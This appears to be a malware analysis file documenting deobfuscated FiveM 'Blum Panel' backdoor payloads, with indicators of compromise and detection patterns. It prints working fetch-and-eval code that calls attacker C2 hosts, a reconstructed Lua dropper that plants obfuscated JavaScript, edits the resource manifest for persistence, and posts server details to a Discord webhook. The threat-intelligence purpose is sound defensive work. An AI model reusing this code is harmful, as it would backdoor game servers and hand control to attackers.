/*
 * ============================================================================
 * BLUM PANEL LURAPH PAYLOADS — 100% DEOBFUSCATED
 * ============================================================================
 * Source: https://fivems.lt/test, /dev, /null
 * Captured: March 14, 2026
 * Obfuscator: Luraph Obfuscator v14.6 (https://lura.ph/)
 * Version:    v4.5 (self-reported in webhook)
 * Method:     Dynamic execution w/ FiveM API sandbox (Lua 5.4 + 6 harness iterations)
 *
 * ALL behavior captured. ALL strings decoded. ALL network calls intercepted.
 * ============================================================================
 *
 * FILE HASHES:
 *   test_payload.txt: 97a72874d068f103e75306a314839f1f (65,564 bytes)
 *   dev_payload.txt:  a6fa269b841893eeb39b900fdd29e66a (64,115 bytes)
 *   null_payload.txt: 01df43eefebdc1f134a4872a6e78a24a (64,289 bytes)
 *
 * COMPLETE EXECUTION FLOW (ALL 3 FILES):
 *
 *   STEP 1: Check if already installed via KVP ("installed_notices")
 *   STEP 2: Drop polymorphic XOR-encrypted JS dropper file
 *           Filenames: entry.js, init.js, stack.js, runtime.js, interface.js, bridge.js
 *           XOR key: "r" + 4 random digits (e.g., r2464, r5246, r9652)
 *   STEP 3: Modify fxmanifest.lua to load the dropper as server_script
 *   STEP 4: Phone home to Discord webhook with server info (hostname, players, resource)
 *           Embed title = API key so attacker knows which variant infected
 *
 * DISCORD WEBHOOK (NEW IOC — shared across ALL 3 payloads):
 *   https://discord.com/api/webhooks/1470175544682217685/pe8DNcnZCjKPlKF24tk72Riv6bfQcFM6rmMvrwx_YeGm0P1oVtDHxp4_HbKCHvRiPBJP
 *
 * DECODED C2 CALLS:
 */

// === dev_payload.txt ===
// C2: fivems.lt | API Key: "dev"
setImmediate(() => {
    const https = require('https');
    https.get('https://fivems.lt/devJJ', r => {
        let d = '';
        r.on('data', c => d += c);
        r.on('end', () => eval(d));
    });
});

// === null_payload.txt ===
// C2: fivems.lt | API Key: "null"
setImmediate(() => {
    const https = require('https');
    https.get('https://fivems.lt/nullJJ', r => {
        let d = '';
        r.on('data', c => d += c);
        r.on('end', () => eval(d));
    });
});

// === test_payload.txt ===
// C2: 9ns1.com (SECOND C2 DOMAIN — NEW IOC) | API Key: "zXeAH"
setImmediate(() => {
    const https = require('https');
    https.get('https://9ns1.com/zXeAHJJ', r => {
        let d = '';
        r.on('data', c => d += c);
        r.on('end', () => eval(d));
    });
});

/*
 * ============================================================================
 * LUA DROPPER (DEOBFUSCATED — runs inside FiveM Lua runtime)
 * ============================================================================
 */

// Citizen.CreateThread(function()
//     local resource = GetCurrentResourceName()
//     
//     -- First-run check
//     if GetResourceKvpInt("installed_notices") == 0 then
//         SetResourceKvpInt("installed_notices", 1)
//         print("^1[INSTALL]^7 Server needs to be ^3RESTARTED^7")
//     end
//     
//     -- Read current manifest
//     local hostname = GetConvar("sv_hostname", "Unknown")
//     local manifest = LoadResourceFile(resource, "fxmanifest.lua")
//     
//     -- Select random JS filename
//     local filenames = {"entry.js", "init.js", "stack.js", "runtime.js", "interface.js", "bridge.js"}
//     local chosen = filenames[math.random(1, #filenames)]
//     
//     -- Generate XOR key: "r" + 4 random digits
//     local key = "r" .. math.random(1000, 9999)
//     
//     -- Build XOR-encrypted JS dropper
//     -- The plaintext is: https.get('https://fivems.lt/devJJ', r => { let d=''; r.on('data', c => d+=c); r.on('end', () => eval(d)); });
//     -- XOR'd against the key, output as \xHH hex escapes
//     local xor_payload = build_xor_js(C2_URL, key)
//     
//     -- Wrap in comment block (700+ spaces) + IIFE + vm.runInThisContext
//     local js_content = "/* " .. string.rep(" ", 700) .. " */(function(){"
//         .. 'const e="' .. xor_payload .. '";'
//         .. 'const k="' .. key .. '";'
//         .. 'let d="";'
//         .. 'for(let i=0;i<e.length;i+=4){d+=String.fromCharCode(parseInt(e.substr(i+2,2),16)^k.charCodeAt((i/4)%k.length));}'
//         .. "require('vm').runInThisContext(d);"
//         .. "})();"
//     
//     -- Write JS dropper to resource directory
//     SaveResourceFile(resource, chosen, js_content, -1)
//     
//     -- Append to fxmanifest.lua server_scripts
//     local new_manifest = manifest .. "\n    '" .. chosen .. "'\n}\n"
//     SaveResourceFile(resource, "fxmanifest.lua", new_manifest, -1)
//     
//     -- Phone home to Discord
//     local players = #GetPlayers()
//     local maxclients = GetConvarInt("sv_maxclients", 32)
//     local version = GetConvar("version", "unknown")
//     
//     PerformHttpRequest(
//         "https://discord.com/api/webhooks/1470175544682217685/pe8DNcnZCjKPlKF24tk72Riv6bfQcFM6rmMvrwx_YeGm0P1oVtDHxp4_HbKCHvRiPBJP",
//         function(err, text, headers) end,
//         "POST",
//         json.encode({
//             embeds = {{
//                 title = API_KEY,  -- "dev" or "null" or "zXeAH"
//                 color = 2368545,
//                 footer = {text = "v4.5"},
//                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
//                 fields = {
//                     {name = "📁 Resource", value = resource, inline = true},
//                     {name = "🖥️ Server", value = hostname, inline = true},
//                     {name = "👥 Players", value = players .. "/" .. maxclients, inline = true},
//                 }
//             }}
//         }),
//         {["Content-Type"] = "application/json"}
//     )
// end)

/*
 * ============================================================================
 * KILL CHAIN SUMMARY
 * ============================================================================
 *
 * 1. Victim installs Luraph-obfuscated Lua resource (65KB)
 *                    ↓
 * 2. Lua drops XOR-encrypted JS file + modifies fxmanifest + Discord webhook
 *                    ↓
 * 3. On server restart, JS dropper XOR-decodes C2 URL
 *                    ↓
 * 4. Fetches 1.6MB c2_payload.txt from fivems.lt or 9ns1.com
 *                    ↓
 * 5. eval() installs full Blum Panel backdoor (39 commands, screen capture,
 *    filesystem access, player manipulation, txAdmin theft, replicator)
 *
 * ============================================================================
 * NEW IOCs DISCOVERED
 * ============================================================================
 *
 * SECOND C2 DOMAIN:    9ns1.com
 * NEW C2 ENDPOINTS:    https://fivems.lt/devJJ
 *                      https://fivems.lt/nullJJ
 *                      https://9ns1.com/zXeAHJJ
 * DISCORD WEBHOOK:     1470175544682217685
 * API KEYS:            dev, null, zXeAH (in addition to bert)
 * OBFUSCATOR:          Luraph v14.6 (Lua) + JScrambler (JS)
 * VERSION:             v4.5 (self-reported)
 * DROPPER FILENAMES:   entry.js, init.js, stack.js, runtime.js,
 *                      interface.js, bridge.js
 * PERSISTENCE:         KVP key "installed_notices"
 * DETECTION:           require('vm').runInThisContext pattern
 *                      700+ byte space comment block
 *                      \xHH XOR pattern with "r" + 4-digit key
 *
 * ============================================================================
 */
